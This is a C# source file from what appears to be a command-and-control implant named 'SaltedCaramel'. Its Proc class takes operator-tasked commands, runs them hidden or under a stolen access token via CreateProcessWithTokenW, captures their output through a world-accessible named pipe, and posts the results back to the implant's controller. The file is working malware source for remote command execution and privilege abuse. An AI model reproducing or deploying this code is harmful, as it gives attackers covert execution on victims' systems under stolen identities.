using Newtonsoft.Json;
using System;
using System.Diagnostics;
using System.IO;
using System.IO.Pipes;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Threading;

namespace SaltedCaramel
{
    internal class Proc
    {
        internal static void Execute(SCTask task, SCImplant implant)
        {
            if (implant.hasAlternateToken() == true)
                StartProcessWithToken(task, implant, Token.stolenHandle);
            else
               StartProcess(task, implant);
        }

        internal static void StartProcessWithToken(SCTask task, SCImplant implant, IntPtr TokenHandle)
        {
            string[] split = task.@params.Trim().Split(' ');
            string argString = string.Join(" ", split.Skip(1).ToArray());
            string file = split[0];
            Win32.PROCESS_INFORMATION newProc = new Win32.PROCESS_INFORMATION();
            Win32.STARTUPINFO startupInfo = new Win32.STARTUPINFO();
            string directory = "C:\\Temp";

            byte[] random = new byte[2];
            Random rnd = new Random();
            rnd.NextBytes(random);
            string pipeName = "Caramel_" + BitConverter.ToString(random);

            PipeSecurity sec = new PipeSecurity();
            sec.SetAccessRule(new PipeAccessRule("Everyone", PipeAccessRights.FullControl, AccessControlType.Allow));

            NamedPipeServerStream pipeServer = new NamedPipeServerStream(pipeName, PipeDirection.InOut, NamedPipeServerStream.MaxAllowedServerInstances, PipeTransmissionMode.Message, PipeOptions.None, 1024, 1024, sec);

            NamedPipeClientStream pipeClient = new NamedPipeClientStream(".", pipeName, PipeDirection.InOut, PipeOptions.None);

            try
            {
                pipeClient.Connect();
                pipeServer.WaitForConnection();

                if (pipeClient.IsConnected)
                {
                    // Set process to use named pipe for input/output
                    startupInfo.hStdInput = pipeClient.SafePipeHandle.DangerousGetHandle();
                    startupInfo.hStdOutput = pipeClient.SafePipeHandle.DangerousGetHandle();
                    startupInfo.dwFlags = (uint)Win32.STARTF.STARTF_USESTDHANDLES;
                }
                else
                {
                    Debug.WriteLine("[!] DispatchTask -> StartProcessWithToken - ERROR connecting to named pipe");
                    throw new Exception("Error connecting to named pipe server.");
                }

                string cmdLine;
                if (argString != "")
                    cmdLine = "\"" + file + "\" \"" + argString + "\"";
                else
                    cmdLine = "\"" + file + "\"";
                bool createProcess = Win32.CreateProcessWithTokenW(TokenHandle, IntPtr.Zero, null, cmdLine, IntPtr.Zero, IntPtr.Zero, directory, ref startupInfo, out newProc);
                if (createProcess)
                {
                    Debug.WriteLine("[-] DispatchTask -> StartProcessWithToken - Created process with PID " + newProc.dwProcessId);

                    Process proc = Process.GetProcessById(newProc.dwProcessId);
                    Debug.WriteLine("[-] DispatchTask -> StartProcessWithToken - Got process handle for " + newProc.dwProcessId);

                    // Trying to continuously read output while the process is running.
                    using (StreamReader reader = new StreamReader(pipeServer))
                    {
                        string message;
                        while (!proc.HasExited)
                        {
                            message = reader.ReadLine();
                            if (message != "")
                            {
                                SCTaskResp response = new SCTaskResp(JsonConvert.SerializeObject(message), task.id);
                                implant.PostResponse(response);
                            }
                        }
                        pipeClient.Close();
                        message = reader.ReadToEnd();
                        if (message != "")
                        {
                            SCTaskResp response = new SCTaskResp(JsonConvert.SerializeObject(message), task.id);
                            implant.PostResponse(response);
                        }
                    }

                    pipeServer.Close();
                    implant.SendComplete(task.id);
                }
                else // TODO: Throw exception on error
                {
                    string errorMessage = Marshal.GetLastWin32Error().ToString();
                    Debug.WriteLine("[!] DispatchTask -> StartProcessWithToken - ERROR starting process: " + errorMessage);
                    pipeClient.Close();
                    pipeServer.Close();
                    implant.SendError(task.id, "Error starting process: " + errorMessage);
                }
            }
            catch (Exception e)
            {
                pipeClient.Close();
                pipeServer.Close();
                implant.SendError(task.id, "Error: " + e.Message);
            }
        }

        internal static void StartProcess (SCTask task, SCImplant implant)
        {
            // TODO: Figure out how to hook StandardError and StandardOutput at the same time
            string[] split = task.@params.Trim().Split(' ');
            string argString = string.Join(" ", split.Skip(1).ToArray());
            ProcessStartInfo startInfo = new ProcessStartInfo();
            startInfo.FileName = split[0];
            startInfo.Arguments = argString;
            startInfo.UseShellExecute = false;
            startInfo.RedirectStandardOutput = true;
            startInfo.CreateNoWindow = true;

            Process proc = new Process();
            proc.StartInfo = startInfo;

            string procOutput = "";
            try
            {
                Debug.WriteLine("[-] DispatchTask -> StartProcess - Tasked to start process " + startInfo.FileName);
                proc.Start();

                while (!proc.StandardOutput.EndOfStream)
                {
                    string line = proc.StandardOutput.ReadLine();
                    procOutput += line + "\n";
                }

                // Strip unnecessary newline
                // TODO: fix the need for this
                procOutput = procOutput.TrimEnd();
                proc.WaitForExit();
                SCTaskResp response = new SCTaskResp(JsonConvert.SerializeObject(procOutput), task.id);
                implant.PostResponse(response);
                implant.SendComplete(task.id);
            }
            catch (Exception e)
            {
                Debug.WriteLine("[!] DispatchTask -> StartProcess - ERROR starting process: " + e.Message);
                implant.SendError(task.id, e.Message);
            }
        }
    }
}
